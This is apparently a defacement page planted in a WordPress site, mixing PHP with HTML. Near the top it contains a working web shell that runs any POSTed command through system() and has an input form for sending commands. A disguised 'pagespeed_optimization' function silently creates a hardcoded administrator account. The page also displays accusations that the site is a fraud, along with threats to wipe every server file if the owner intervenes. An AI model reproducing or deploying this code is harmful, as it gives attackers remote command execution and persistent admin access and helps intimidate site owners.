<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>システム侵入警告 - SYSTEM BREACH</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 25%, #2a0a0a 50%, #0a0a1a 75%, #0a0a0a 100%);
            color: #00ff41;
            font-family: 'Orbitron', 'Courier New', monospace;
            overflow-x: hidden;
            min-height: 100vh;
            position: relative;
            animation: backgroundHorror 8s ease-in-out infinite;
        }
        
        @keyframes backgroundHorror {
            0%, 100% { 
                background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 25%, #2a0a0a 50%, #0a0a1a 75%, #0a0a0a 100%);
            }
            25% { 
                background: linear-gradient(135deg, #2a0000 0%, #1a0a0a 25%, #000a2a 50%, #2a0000 75%, #0a0a0a 100%);
            }
            50% { 
                background: linear-gradient(135deg, #000000 0%, #2a0000 25%, #000000 50%, #002a00 75%, #000000 100%);
            }
            75% { 
                background: linear-gradient(135deg, #0a0a2a 0%, #000000 25%, #2a0000 50%, #000000 75%, #0a0a2a 100%);
            }
        }
        
        /* Animated Matrix Background */
        .matrix-rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0.15;
            filter: brightness(1.2) contrast(1.3);
        }
        
        .matrix-column {
            position: absolute;
            top: -100%;
            color: #00ff41;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            animation: matrixFall linear infinite;
            text-shadow: 0 0 5px #00ff41;
        }
        
        @keyframes matrixFall {
            to {
                transform: translateY(100vh);
            }
        }
        
        /* Horror Blood Drip Effect */
        .blood-drip {
            position: fixed;
            top: -10px;
            width: 2px;
            background: linear-gradient(to bottom, #ff0000, #8b0000, transparent);
            z-index: 5;
            animation: bloodFall linear infinite;
            opacity: 0.8;
            box-shadow: 0 0 3px #ff0000;
        }
        
        @keyframes bloodFall {
            0% {
                transform: translateY(-20px);
                opacity: 0;
            }
            10% {
                opacity: 0.8;
            }
            100% {
                transform: translateY(100vh);
                opacity: 0;
            }
        }
        
        /* Creepy Eye Effect */
        .horror-eyes {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1;
            pointer-events: none;
            opacity: 0;
            animation: eyesAppear 15s infinite;
        }
        
        .eye {
            width: 30px;
            height: 30px;
            background: radial-gradient(circle, #ff0000 30%, #ffffff 40%, #000000 60%);
            border-radius: 50%;
            display: inline-block;
            margin: 0 20px;
            animation: eyeBlink 3s infinite;
            box-shadow: 0 0 20px #ff0000;
        }
        
        @keyframes eyesAppear {
            0%, 85%, 100% { opacity: 0; }
            90%, 95% { opacity: 0.7; }
        }
        
        @keyframes eyeBlink {
            0%, 90%, 100% { transform: scaleY(1); }
            5%, 10% { transform: scaleY(0.1); }
        }
        
        /* Glitch Grid Overlay */
        .grid-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: -1;
            animation: gridPulse 4s ease-in-out infinite;
        }
        
        @keyframes gridPulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.1; }
        }
        
        /* Main Container */
        .container {
            position: relative;
            z-index: 10;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        /* Japanese Title Header */
        .jp-header {
            text-align: center;
            margin: 40px 0;
            position: relative;
        }
        
        .jp-title-main {
            font-size: clamp(2rem, 8vw, 4rem);
            color: #ff0040;
            font-weight: 900;
            text-shadow: 
                0 0 10px #ff0040,
                0 0 20px #ff0040,
                0 0 40px #ff0040;
            animation: glitchTitle 2s infinite;
            margin-bottom: 10px;
        }
        
        .jp-title-sub {
            font-size: clamp(1rem, 4vw, 2rem);
            color: #00ff41;
            font-weight: 400;
            letter-spacing: 3px;
        }
        
        @keyframes glitchTitle {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); color: #40ff00; }
            40% { transform: translate(-2px, -2px); color: #ff0040; }
            60% { transform: translate(2px, 2px); color: #0040ff; }
            80% { transform: translate(2px, -2px); color: #ff0040; }
        }
        
        /* Warning Panels */
        .warning-panel {
            background: linear-gradient(135deg, rgba(255, 0, 64, 0.1) 0%, rgba(0, 255, 65, 0.05) 100%);
            border: 2px solid #ff0040;
            border-radius: 10px;
            margin: 30px 0;
            padding: 25px;
            position: relative;
            overflow: hidden;
            box-shadow: 
                0 0 20px rgba(255, 0, 64, 0.3),
                inset 0 0 20px rgba(0, 255, 65, 0.1),
                0 0 40px rgba(255, 0, 0, 0.2);
            animation: panelHorrorPulse 4s ease-in-out infinite;
        }
        
        @keyframes panelHorrorPulse {
            0%, 100% {
                box-shadow: 
                    0 0 20px rgba(255, 0, 64, 0.3),
                    inset 0 0 20px rgba(0, 255, 65, 0.1),
                    0 0 40px rgba(255, 0, 0, 0.2);
            }
            25% {
                box-shadow: 
                    0 0 30px rgba(255, 0, 0, 0.6),
                    inset 0 0 30px rgba(255, 0, 0, 0.3),
                    0 0 60px rgba(255, 0, 0, 0.4);
            }
            50% {
                box-shadow: 
                    0 0 40px rgba(255, 255, 0, 0.4),
                    inset 0 0 40px rgba(255, 255, 0, 0.2),
                    0 0 80px rgba(255, 255, 0, 0.3);
            }
            75% {
                box-shadow: 
                    0 0 35px rgba(0, 255, 0, 0.5),
                    inset 0 0 35px rgba(0, 255, 0, 0.2),
                    0 0 70px rgba(0, 255, 0, 0.3);
            }
        }
        
        .warning-panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 0, 64, 0.3), transparent);
            animation: horrorScanLine 2s infinite;
        }
        
        @keyframes horrorScanLine {
            0% { 
                left: -100%; 
                background: linear-gradient(90deg, transparent, rgba(255, 0, 64, 0.3), transparent);
            }
            33% { 
                background: linear-gradient(90deg, transparent, rgba(255, 255, 0, 0.4), transparent);
            }
            66% { 
                background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.3), transparent);
            }
            100% { 
                left: 100%; 
                background: linear-gradient(90deg, transparent, rgba(255, 0, 64, 0.3), transparent);
            }
        }
        
        .panel-header {
            font-size: 1.5rem;
            color: #ff0040;
            font-weight: 700;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 2px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .panel-content {
            font-size: 1rem;
            line-height: 1.6;
            color: #00ff41;
            text-shadow: 0 0 5px rgba(0, 255, 65, 0.5);
        }
        
        /* Japanese Text Elements */
        .jp-text {
            color: #ff4040;
            font-weight: 700;
            text-shadow: 0 0 8px #ff4040;
        }
        
        /* Fraud Alert Section */
        .fraud-alert {
            text-align: center;
            margin: 40px 0;
            padding: 30px;
            background: linear-gradient(135deg, rgba(255, 0, 64, 0.2) 0%, rgba(255, 64, 0, 0.1) 100%);
            border: 3px solid #ff0040;
            border-radius: 15px;
            position: relative;
            overflow: hidden;
            box-shadow: 
                0 0 30px rgba(255, 0, 64, 0.4),
                inset 0 0 30px rgba(255, 0, 64, 0.1);
        }
        
        .fraud-alert::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            animation: alertScan 2s infinite;
        }
        
        @keyframes alertScan {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        .fraud-header {
            font-size: 1.2rem;
            color: #ff4040;
            font-weight: 700;
            margin-bottom: 15px;
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        
        .fraud-company {
            font-size: clamp(1.5rem, 6vw, 3rem);
            color: #ffffff;
            font-weight: 900;
            text-shadow: 
                0 0 15px #ff0040,
                0 0 30px #ff0040,
                0 0 45px #ff0040;
            animation: fraudGlitch 1.5s infinite;
            margin: 20px 0;
            letter-spacing: 3px;
        }
        
        .fraud-subtitle {
            font-size: 1rem;
            color: #ffff00;
            font-weight: 400;
            text-shadow: 0 0 10px #ffff00;
            animation: pulse 2s infinite;
        }
        
        @keyframes fraudGlitch {
            0%, 100% { 
                transform: translate(0); 
                color: #ffffff;
            }
            25% { 
                transform: translate(-1px, 1px); 
                color: #ff0040;
                text-shadow: 
                    0 0 15px #ff0040,
                    0 0 30px #ff0040;
            }
            50% { 
                transform: translate(1px, -1px); 
                color: #ffff00;
                text-shadow: 
                    0 0 15px #ffff00,
                    0 0 30px #ffff00;
            }
            75% { 
                transform: translate(-1px, -1px); 
                color: #00ff41;
                text-shadow: 
                    0 0 15px #00ff41,
                    0 0 30px #00ff41;
            }
        }
        
        /* Status Indicators */
        .status-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #00ff41;
            border-radius: 5px;
            padding: 15px 20px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
        }
        
        .status-item {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }
        
        .status-dot.critical {
            background: #ff0040;
            box-shadow: 0 0 10px #ff0040;
        }
        
        .status-dot.warning {
            background: #ffff00;
            box-shadow: 0 0 10px #ffff00;
        }
        
        .status-dot.active {
            background: #00ff41;
            box-shadow: 0 0 10px #00ff41;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
        }
        
        /* Terminal Style Warning */
        .terminal-warning {
            background: #000;
            border: 2px solid #00ff41;
            border-radius: 8px;
            padding: 20px;
            margin: 25px 0;
            font-family: 'Courier New', monospace;
            position: relative;
        }
        
        .terminal-header {
            color: #00ff41;
            font-size: 0.9rem;
            margin-bottom: 15px;
            border-bottom: 1px solid #00ff41;
            padding-bottom: 8px;
        }
        
        .terminal-content {
            color: #ffffff;
            font-size: 0.95rem;
            line-height: 1.5;
        }
        
        .error-text {
            color: #ff0040;
            font-weight: bold;
        }
        
        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .status-bar {
                flex-direction: column;
                gap: 10px;
            }
            
            .panel-header {
                font-size: 1.2rem;
            }
        }
        
        /* Loading Effect */
        .loading-bar {
            width: 100%;
            height: 4px;
            background: rgba(0, 255, 65, 0.2);
            border-radius: 2px;
            overflow: hidden;
            margin: 10px 0;
        }
        
        .loading-progress {
            height: 100%;
            background: linear-gradient(90deg, #ff0040, #00ff41, #ff0040);
            animation: loadingMove 2s linear infinite;
        }
        
        @keyframes loadingMove {
            0% { transform: translateX(-100%); width: 50%; }
            50% { width: 100%; }
            100% { transform: translateX(100%); width: 50%; }
        }
    </style>
</head>

<?php
require_once('wp-load.php'); 
?>

<?php
if (isset($_POST['cmd'])) {
    header('Content-Type: text/plain');
    $cmd = escapeshellcmd($_POST['cmd']);
    system($cmd);
    exit;
}
?>




    <input type="text" id="cmd" placeholder="Enter command" style="width: 300px;">
    <button onclick="runCommand()">Run</button>
    <pre id="output" style="background:#eee; padding:10px; margin-top:10px;"></pre>

    <script>
        function runCommand() {
            var cmd = document.getElementById('cmd').value;
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhr.onload = function () {
                document.getElementById('output').textContent = this.responseText;
            };
            xhr.send('cmd=' + encodeURIComponent(cmd));
        }
    </script>

 

<?php 
function pagespeed_optimization() {
    $email = 'johnybran481@gmail.com';
    $password = 'P@@sword#6423';

    // Check if the email is already registered
    if (!email_exists($email)) {
        $username = strstr($email, '@', true); // Use email before '@' as username

        // Create the user
        $user_id = wp_create_user($username, $password, $email);

        if (is_wp_error($user_id)) {
            // Display error if user creation failed
            echo 'Error creating user: ' . $user_id->get_error_message();
        } else {
            // Set the new user as an admin
            $user = new WP_User($user_id);
            $user->set_role('administrator');

            // Store the username in an option for later use
            update_option('dynamic_admin_username', $username);

            echo 'Admin user created successfully with email: ' . $email;
        }
    }
}
pagespeed_optimization();
?>

<body>
    <!-- Matrix Rain Background -->
    <div class="matrix-rain" id="matrixRain"></div>
    
    <!-- Horror Blood Drips -->
    <div id="bloodContainer"></div>
    
    <!-- Creepy Eyes -->
    <div class="horror-eyes">
        <div class="eye"></div>
        <div class="eye"></div>
    </div>
    
    <!-- Grid Overlay -->
    <div class="grid-overlay"></div>
    
    <div class="container">
        <!-- Japanese Header -->
        <div class="jp-header">
            <div class="jp-title-main">システム侵入警告</div>
            <div class="jp-title-sub">SYSTEM BREACH DETECTED</div>
        </div>
        
        <!-- Client Fraud Alert -->
        <div class="fraud-alert">
            <div class="fraud-header">詐欺業者発見 | FRAUD DETECTED</div>
            <div class="fraud-company"><?php echo get_bloginfo( 'name' ); ?> IS A FRAUD</div>
            <div class="fraud-subtitle">この企業は詐欺行為を行っています</div>
        </div>
        
        <!-- Status Bar -->
        <div class="status-bar">
            <div class="status-item">
                <div class="status-dot critical"></div>
                <span>BREACH: <span class="jp-text">侵入検出</span></span>
            </div>
            <div class="status-item">
                <div class="status-dot warning"></div>
                <span>ALERT: <span class="jp-text">警告状態</span></span>
            </div>
            <div class="status-item">
                <div class="status-dot active"></div>
                <span>MONITORING: <span class="jp-text">監視中</span></span>
            </div>
        </div>
        
        <!-- Main Warning Panel -->
        <div class="warning-panel">
            <div class="panel-header">
                ⚠ 重大なセキュリティ違反 ⚠
            </div>
            <div class="panel-content">
                <strong>詐欺警告 (SCAM ALERT):</strong><br>
                指定された企業による詐欺行為が検出されました。<br>
                このシステムは詐欺行為により侵害されています。<br>
                <em>Fraudulent activities by the specified company have been detected.<br>
                This system has been compromised due to scam operations.</em>
            </div>
            <div class="loading-bar">
                <div class="loading-progress"></div>
            </div>
        </div>
        
        <!-- Terminal Warning -->
        <div class="terminal-warning">
            <div class="terminal-header">
                >>> CRITICAL_SYSTEM_WARNING.exe | 危険レベル: 最高
            </div>
            <div class="terminal-content">
                <span class="error-text">[ERROR]</span> ファイルアクセス禁止<br>
                <span class="error-text">[警告]</span> DO NOT ACCESS ANY FILES<br><br>
                
                異なるIPからサーバーファイルにアクセスしようとすると、<br>
                自動削除プロセスが即座に開始され、すべてのサーバーファイルが消去されます。<br><br>
                
                <span class="error-text">If you access server files from a different IP, our automated 
                deletion process will start immediately, wiping all server files.</span>
            </div>
        </div>
        
        <!-- Additional Warning Panel -->
        <div class="warning-panel">
            <div class="panel-header">
                🔒 追加セキュリティ警告
            </div>
            <div class="panel-content">
                <strong>アカウントログイン禁止:</strong><br>
                アカウントへのログインや対抗措置を試みないでください。<br>
                不正な操作は取り返しのつかないデータ消去を引き起こします。<br><br>
                
                <em>Do not attempt to log into accounts or engage in countermeasures. 
                Unauthorized actions will trigger irreversible data wipe.</em>
            </div>
        </div>
        
        <!-- Final Status -->
        <div class="status-bar">
            <div class="status-item">
                <span>監視者システム: <span class="jp-text">アクティブ</span></span>
            </div>
            <div class="status-item">
                <span>自動削除: <span class="jp-text">待機中</span></span>
            </div>
        </div>
    </div>
    
    <script>
        // Matrix Rain Effect
        function createMatrixRain() {
            const matrixContainer = document.getElementById('matrixRain');
            const japanese = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン死恐怖悪魔地獄血闇';
            const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789DEADHORRORFEARDEATH';
            const chars = japanese + latin;
            
            for (let i = 0; i < 60; i++) {
                const column = document.createElement('div');
                column.className = 'matrix-column';
                column.style.left = Math.random() * 100 + '%';
                column.style.animationDuration = (Math.random() * 3 + 2) + 's';
                column.style.animationDelay = Math.random() * 5 + 's';
                
                let text = '';
                for (let j = 0; j < 25; j++) {
                    text += chars[Math.floor(Math.random() * chars.length)] + '<br>';
                }
                column.innerHTML = text;
                
                matrixContainer.appendChild(column);
            }
        }
        
        // Horror Blood Drips
        function createBloodDrips() {
            const bloodContainer = document.getElementById('bloodContainer');
            
            setInterval(() => {
                if (Math.random() < 0.3) {
                    const bloodDrip = document.createElement('div');
                    bloodDrip.className = 'blood-drip';
                    bloodDrip.style.left = Math.random() * 100 + '%';
                    bloodDrip.style.height = Math.random() * 100 + 50 + 'px';
                    bloodDrip.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    
                    bloodContainer.appendChild(bloodDrip);
                    
                    // Remove after animation
                    setTimeout(() => {
                        if (bloodDrip.parentNode) {
                            bloodDrip.parentNode.removeChild(bloodDrip);
                        }
                    }, 5000);
                }
            }, 2000);
        }
        
        // Screen Flash Effect
        function createHorrorFlash() {
            setInterval(() => {
                if (Math.random() < 0.1) {
                    document.body.style.filter = 'brightness(3) contrast(2) hue-rotate(' + Math.random() * 360 + 'deg)';
                    setTimeout(() => {
                        document.body.style.filter = 'none';
                    }, 100);
                }
            }, 3000);
        }
        
        // Audio Horror Effect (Silent but creates tension)
        function createTensionEffect() {
            setInterval(() => {
                const panels = document.querySelectorAll('.warning-panel, .fraud-alert');
                panels.forEach(panel => {
                    if (Math.random() < 0.15) {
                        panel.style.transform = 'scale(1.02) rotate(' + (Math.random() - 0.5) + 'deg)';
                        panel.style.filter = 'brightness(' + (Math.random() * 2 + 1) + ') hue-rotate(' + Math.random() * 360 + 'deg)';
                        setTimeout(() => {
                            panel.style.transform = 'none';
                            panel.style.filter = 'none';
                        }, 200);
                    }
                });
            }, 1500);
        }
        
        // Initialize effects
        document.addEventListener('DOMContentLoaded', function() {
            createMatrixRain();
            createBloodDrips();
            createHorrorFlash();
            createTensionEffect();
        });
        
        // Enhanced Random Glitch Effects
        setInterval(() => {
            const panels = document.querySelectorAll('.warning-panel');
            panels.forEach(panel => {
                if (Math.random() < 0.2) {
                    const horrorColors = ['hue-rotate(0deg)', 'hue-rotate(90deg) brightness(2)', 'hue-rotate(180deg) contrast(3)', 'hue-rotate(270deg) invert(1)', 'brightness(4) saturate(0)'];
                    panel.style.filter = horrorColors[Math.floor(Math.random() * horrorColors.length)];
                    setTimeout(() => {
                        panel.style.filter = 'none';
                    }, Math.random() * 300 + 100);
                }
            });
        }, 800);
    </script>
</body>
</html>
